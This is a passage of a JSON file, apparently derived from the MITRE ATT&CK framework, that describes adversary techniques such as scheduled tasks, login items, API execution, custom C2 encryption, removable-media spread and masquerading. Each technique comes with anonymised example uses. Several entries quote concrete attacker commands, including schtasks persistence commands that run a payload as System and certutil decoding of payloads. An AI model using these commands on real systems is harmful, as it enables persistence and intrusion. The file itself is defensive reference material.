    "description": "Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.",
    "example_uses": [
      "A  file stealer can run a TaskScheduler DLL to add persistence.",
      "has created scheduled tasks that run a VBScript to execute a payload on victim machines.",
      "contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.",
      "creates a scheduled task on the system that provides persistence.",
      "creates a scheduled task to run itself every three minutes.",
      "launched a scheduled task to gain persistence using the schtasks /create /sc command.",
      "used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.",
      "has created Windows tasks to establish persistence.",
      "creates a scheduled task to ensure it is re-executed everyday.",
      "creates a scheduled task to maintain persistence on the victim’s machine.",
      "establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“.",
      "launches a scheduled task.",
      "has used scheduled tasks to maintain RDP backdoors.",
      "creates a scheduled task to establish by executing a malicious payload every subsequent minute.",
      "has the capability to schedule remote AT jobs.",
      "New-UserPersistenceOption Persistence argument can be used to establish via a .",
      "has used  and  to register a scheduled task to execute malware during lateral movement.",
      "creates scheduled tasks to establish persistence.",
      "can establish persistence by creating a scheduled task.",
      "has used a scheduled task for persistence.",
      "persists through a scheduled task that executes it every minute.",
      "can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\".",
      "can execute commands remotely by creating a new schedule task on the remote system",
      "has used scheduled tasks to persist on victim systems.",
      "has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.",
      "copies an executable payload to the target system by using  and then scheduling an unnamed task to execute the malware.",
      "can be used to schedule a task on a system.",
      "malware has created scheduled tasks to establish persistence.",
      "schedules tasks to invoke its components in order to establish persistence.",
      "tries to add a scheduled task to establish persistence.",
      "has registered itself as a scheduled task to run each time the current user logs in.",
      "has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.",
      "is used to schedule tasks on a Windows system to run at a specific date and time.",
      "schedules the execution one of its modules by creating a new scheduler task.",
      "uses scheduled tasks typically named \"Watchmon Service\" for persistence.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "One persistence mechanism used by  is to register itself as a scheduled task.",
      "malware creates a scheduled task entitled “IE Web Cache” to execute a malicious file hourly.",
      "has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and PoS malware known as TRINITY.",
      "actors use  to schedule tasks to run self-extracting RAR archives, which install  or  on other victims on a network.",
      "actors used the native  Windows task scheduler tool to use scheduled tasks for execution on a victim network.",
      "An  downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\".",
      "used named and hijacked scheduled tasks to establish persistence."
    ],
    "id": "T1053",
    "name": "Scheduled Task",
    "similar_words": [
      "Scheduled Task"
    ]
  },
  "attack-pattern--36675cd3-fe00-454c-8516-aebecacbe9d9": {
    "description": "MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them (Citation: Adding Login Items). Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). These login items are stored in the user's ~/Library/Preferences/ directory in a plist file called com.apple.loginitems.plist (Citation: Methods of Mac Malware Persistence). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ‘Hide’ the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method  SMLoginItemSetEnabled  can be used to set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1155) can do this as well  (Citation: Adding Login Items).",
    "example_uses": [
      "persists via a login item."
    ],
    "id": "T1162",
    "name": "Login Item",
    "similar_words": [
      "Login Item"
    ]
  },
  "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8": {
    "description": "Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser, to include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).",
    "example_uses": [],
    "id": "T1176",
    "name": "Browser Extensions",
    "similar_words": [
      "Browser Extensions"
    ]
  },
  "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670": {
    "description": "Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters. (Citation: Microsoft CreateProcess)\n\nAdditional Windows API calls that can be used to execute binaries include: (Citation: Kanthak Verifier)\n\n* CreateProcessA() and CreateProcessW(),\n* CreateProcessAsUserA() and CreateProcessAsUserW(),\n* CreateProcessInternalA() and CreateProcessInternalW(),\n* CreateProcessWithLogonW(), CreateProcessWithTokenW(),\n* LoadLibraryA() and LoadLibraryW(),\n* LoadLibraryExA() and LoadLibraryExW(),\n* LoadModule(),\n* LoadPackagedLibrary(),\n* WinExec(),\n* ShellExecuteA() and ShellExecuteW(),\n* ShellExecuteExA() and ShellExecuteExW()",
    "example_uses": [
      "leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.",
      "malware can leverage the Windows API call, CreateProcessA(), for execution.",
      "creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().",
      "leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.",
      "uses the API call ShellExecuteW for execution.",
      "executes payloads using the Windows API call CreateProcessW().",
      "parses the export tables of system DLLs to locate and call various Windows API functions.",
      "uses the Windows API call, CreateProcessW(), to manage execution flow.",
      "contains the execFile function to execute a specified file on the system using the NSTask:launch method.",
      "is capable of starting a process using CreateProcess.",
      "has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.",
      "\"beacon\" payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe",
      "can use the Windows API function CreateProcess to execute another process."
    ],
    "id": "T1106",
    "name": "Execution through API",
    "similar_words": [
      "Execution through API"
    ]
  },
  "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427": {
    "description": "Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as FailureCommand) that may be executed in an elevated context anytime the service fails or is intentionally corrupted. (Citation: Twitter Service Recovery Nov 2017)",
    "example_uses": [],
    "id": "T1058",
    "name": "Service Registry Permissions Weakness",
    "similar_words": [
      "Service Registry Permissions Weakness"
    ]
  },
  "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e": {
    "description": "Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these utilities for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106).",
    "example_uses": [
      "can be used to subvert controls and possibly conceal command execution by not directly invoking ."
    ],
    "id": "T1202",
    "name": "Indirect Command Execution",
    "similar_words": [
      "Indirect Command Execution"
    ]
  },
  "attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d": {
    "description": "Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.\n\nCustom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.\n\nSome adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)",
    "example_uses": [
      "variants reported on in 2014 and 2015 used a simple XOR cipher for C2.",
      "uses FakeTLS to communicate with its C2 server.",
      "uses a customized XOR algorithm to encrypt C2 communications.",
      "encrypts C2 traffic using an XOR/ADD cipher and uses a FakeTLS method.",
      "uses variations of a simple XOR encryption routine for C&C communications.",
      "uses XOR with random keys for its communications.",
      "encodes C2 beacons using XOR.",
      "uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.",
      "uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.",
      "C2 traffic is encrypted using bitwise NOT and XOR operations.",
      "uses custom encryption for C2 using 3DES and RSA.",
      "Some  samples use a custom encryption method for C2 traffic using AES, base64 encoding, and multiple keys.",
      "has used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.",
      "The  C2 channel uses an 11-byte XOR algorithm to hide data.",
      "uses fake Transport Layer Security (TLS) to communicate with its C2 server, encoding data with RC4 encryption.",
      "obfuscates C2 traffic with variable 4-byte XOR keys.",
      "C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.",
      "contains a custom version of the RC4 algorithm that includes a programming error.",
      "encrypts C2 traffic with a custom RC4 variant.",
      "encodes C2 traffic with single-byte XOR keys.",
      "performs XOR encryption.",
      "obfuscates C2 communication using a 1-byte XOR with the key 0xBE.",
      "The original variant of  encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation.  has also included HTML code in C2 traffic in an apparent attempt to evade detection. Additionally, some variants of  use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.",
      "will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS instead if the DES decoding fails.",
      "uses a custom encryption algorithm on data sent back to the C2 server over HTTP.",
      "The C2 server response to a beacon sent by a variant of  contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of  use various XOR operations to encrypt C2 data.",
      "encrypts C2 data with a ROR by 3 and an XOR by 0x23.",
      "can encrypt C2 data with a custom technique using MD5, base64-encoding, and RC4.",
      "Before being appended to image files,  commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.",
      "uses an XOR 0x1 loop to encrypt its C2 domain.",
      "performs XOR encryption.",
      "is known to utilize encryption within network protocols.",
      "encrypts C2 content with XOR using a single byte, 0x12.",
      "Several  malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another  malware sample XORs C2 traffic.  malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks."
    ],
    "id": "T1024",
    "name": "Custom Cryptographic Protocol",
    "similar_words": [
      "Custom Cryptographic Protocol"
    ]
  },
  "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4": {
    "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",
    "example_uses": [
      "has functionality to copy itself to removable media.",
      "drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.",
      "Part of 's operation involved using  modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.",
      "contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using autorun functionality.",
      "searches for removable media and duplicates itself onto it.",
      "may have used the  malware to move onto air-gapped networks.  targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.",
      "drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.",
      "is capable of spreading to USB devices.",
      "selective infector modifies executables stored on removable media as a method of spreading across computers.",
      "uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted."
    ],
    "id": "T1091",
    "name": "Replication Through Removable Media",
    "similar_words": [
      "Replication Through Removable Media"
    ]
  },
  "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5": {
    "description": "Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.\n\nAdversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.",
    "example_uses": [
      "can download files off the target system to send back to the server.",
      "collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.",
      "collected complete contents of the 'Pictures' folder from compromised Windows systems.",
      "collects data from the local victim system.",
      "collected data from local victim systems.",
      "collects files from the local system.",
      "can collect data from user directories.",
      "creates a backdoor through which remote attackers can steal system information.",
      "uploads files from a specified directory to the C2 server.",
      "searches the local system and gathers data.",
      "collects local files and information from the victim’s local machine.",
      "steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.",
      "creates a backdoor through which remote attackers can retrieve files.",
      "has collected data from victims' local systems.",
      "can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).",
      "creates a backdoor through which remote attackers can obtain data from local systems.",
      "contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.",
      "can upload files from compromised hosts.",
      "scrapes memory for properly formatted payment card data.",
      "has retrieved internal documents from machines inside victim environments, including by using  to stage documents before.",
      "creates a backdoor through which remote attackers can read data from files.",
      "has exfiltrated files stolen from local systems.",
      "will identify Microsoft Office documents on the victim's computer.",
      "can collect data from a local system.",
      "dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.",
      "steals user files from local hard drives with file extensions that match a predefined list.",
      "searches for interesting files (either a default or customized set of file extensions) on the local system.  will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories.  also collects information stored in the Windows Address Book.",
      "collects user files from the compromised host based on predefined file extensions.",
      "When it first starts,  crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.",
      "exfiltrates data collected from the victim mobile device.",
      "searches for files on local drives based on a predefined list of file extensions.",
      "collected and exfiltrated files from the infected system.",
      "malware gathers data from the local victim system.",
      "malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.  malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.",
      "has used Android backdoors capable of exfiltrating specific files directly from the infected devices.",
      "ran a command to compile an archive of file types of interest from the victim user's directories.",
      "has collected files from a local victim.",
      "gathered information and files from local directories for exfiltration."
    ],
    "id": "T1005",
    "name": "Data from Local System",
    "similar_words": [
      "Data from Local System"
    ]
  },
  "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c": {
    "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)\n\nAnother example is using the Windows copy /b command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.",
    "example_uses": [
      "malware can decode contents from a payload that was Base64 encoded and write the contents to a file.",
      "drops a Word file containing a Base64-encoded file in it that is read, decoded, and dropped to the disk by the macro.",
      "extracts and decrypts stage 3 malware, which is stored in encrypted resources.",
      "has a function for decrypting data containing C2 configuration information.",
      "One  variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".",
      "decrypts resources needed for targeting the victim.",
      "decodes embedded XOR strings.",
      "concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.",
      "uses an encrypted file to store commands and configuration values.",
      "During execution,  malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.",
      "can decrypt, unpack and load a DLL from its resources.",
      "has used  in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has used certutil -decode to decode files on the victim’s machine when dropping .",
      "decrypts code, strings, and commands to use once it's on the victim's machine.",
      "decodes an embedded configuration using XOR.",
      "decrypts and extracts a copy of its main DLL payload when executing.",
      "deobfuscates its code.",
      "decodes Base64 strings and decrypts strings using a custom XOR algorithm.",
      "decodes the configuration data and modules.",
      "uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.",
      "deobfuscates its strings and APIs once its executed.",
      "An  HTTP malware variant decrypts strings using single-byte XOR keys.",
      "decodes strings in the malware using XOR and RC4.",
      "decoded base64-encoded PowerShell commands using a VBS file.",
      "shellcode decrypts and decompresses its RC4-encrypted payload.",
      "An  macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.",
      "has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.",
      "A  macro has run a PowerShell command to decode file contents.  has also used  to decode base64-encoded files on victims.",
      "downloads encoded payloads and decodes them on the victim.",
      "uses the certutil command to decode a payload file.",
      "decrypts and executes shellcode from a file called Stars.jps.",
      "has been used to decode binaries hidden inside certificate files as Base64 information."
    ],
    "id": "T1140",
    "name": "Deobfuscate/Decode Files or Information",
    "similar_words": [
      "Deobfuscate/Decode Files or Information"
    ]
  },
  "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7": {
    "description": "Supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)\n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics  on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011)",
    "example_uses": [
      "was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.",
      "has targeted manufacturers in the supply chain for the defense industry.",
      "was distributed through a compromised update to a Tor client with a coin miner payload."
    ],
    "id": "T1195",
    "name": "Supply Chain Compromise",
    "similar_words": [
      "Supply Chain Compromise"
    ]
  },
  "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c": {
    "description": "The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL) (Citation: NVD CVE-2016-6662), standard services (like SMB (Citation: CIS Multiple SMB Vulnerabilities) or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services. (Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211).\n\nFor websites and databases, the OWASP top 10 gives a good list of the top 10 most common web-based vulnerabilities. (Citation: OWASP Top 10)",
    "example_uses": [
      "has been observed using SQL injection to gain access to systems.",
      "is used to automate SQL injection.",
      "can be used to automate exploitation of SQL injection vulnerabilities."
    ],
    "id": "T1190",
    "name": "Exploit Public-Facing Application",
    "similar_words": [
      "Exploit Public-Facing Application"
    ]
  },
  "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7": {
    "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be whitelisted within a target environment. Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n\nRemote access tools may be established and used post-compromise as alternate communications channel for [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)",
    "example_uses": [
      "has a plugin for VNC and Ammyy Admin Tool.",
      "used the Ammyy Admin tool as well as TeamViewer for remote access.",
      "used a cloud-based remote access software called LogMeIn for their attacks.",
      "used legitimate programs such as AmmyAdmin and Team Viewer for remote interactive C2 to target systems."
    ],
    "id": "T1219",
    "name": "Remote Access Tools",
    "similar_words": [
      "Remote Access Tools"
    ]
  },
  "attack-pattern--428ca9f8-0e33-442a-be87-f869cb4cf73e": {
    "description": "An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.",
    "example_uses": [
      "can use Obfs3, a pluggable transport, to add another layer of encryption and obfuscate TLS.",
      "encapsulates traffic in multiple layers of encryption.",
      "communicates using HTTPS and uses a custom encryption cipher to encrypt the HTTPS message body.",
      "encrypts C2 traffic with HTTPS and also encodes it with a single-byte XOR key."
    ],
    "id": "T1079",
    "name": "Multilayer Encryption",
    "similar_words": [
      "Multilayer Encryption"
    ]
  },
  "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0": {
    "description": "Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.\n\nOne variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs. This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.\n\n\n### Windows\nIn another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)\n\nAn example of abuse of trusted locations in Windows would be the C:\\Windows\\System32 directory. Examples of trusted binary names that can be given to malicious binares include \"explorer.exe\" and \"svchost.exe\".\n\n### Linux\nAnother variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)\n\nAn example of abuse of trusted locations in Linux  would be the /bin directory. Examples of trusted binary names that can be given to malicious binares include \"rsyncd\" and \"dbus-inotifier\". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)",
    "example_uses": [
      "installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.",
      "variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe, as well as by adding a new service named OfficeUpdateService.",
      "contains several references to football (including \"football,\" \"score,\" \"ball,\" and \"loose\") in a likely attempt to disguise its traffic.",
      "created accounts disguised as legitimate backup and service accounts as well as an email administration account.",
      "renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.",
      "saves one of its files as mpr.dll in the Windows folder, masquerading as a legitimate library file.",
      "has dropped binaries as files named microsoft_network.exe and crome.exe.",
      "uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.",
      "establishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service.",
      "used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.",
      "Some  variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.",
      "adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.",
      "mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.",
      "has used filenames and Registry key names associated with Windows Defender.",
      "attempts to hide its payloads using legitimate filenames.",
      "has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.",
      "The  dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.",
      "To establish persistence,  adds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager.",
      "named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\\microsoft\\security.",
      "has masqueraded as legitimate Adobe Content Management System files.",
      "New services created by  are made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\".",
      "has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.",
      "copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).",
      "can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.",
      "installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.",
      "mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.",
      "saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.",
      "has created a scheduled task named “AdobeFlashSync” to establish persistence.",
      "If installing itself as a service fails,  instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.",
      "In one instance,  added  as a service with a display name of \"Corel Writing Tools Utility.\"",
      "mimics a legitimate Russian program called USB Disk Security.",
      "has used hidden or non-printing characters to help masquerade file names on a system, such as appending a Unicode no-break space character to a legitimate service name.",
      "A  implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.",
      "uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\; the malicious file by the same name is saved in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\.",
      "installs itself in %ALLUSERPROFILE%\\\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe; the directory name is missing a space and the file name is missing the letter \"o.\"",
      "The  loader implements itself with the name Security Support Provider, a legitimate Windows function. Various  .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare.  also disguised malicious modules using similar filenames as custom network encryption software on victims.",
      "creates a new service named “ntssrv” that attempts to appear legitimate; the service's display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.”",
      "To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.",
      "may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.",
      "saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.",
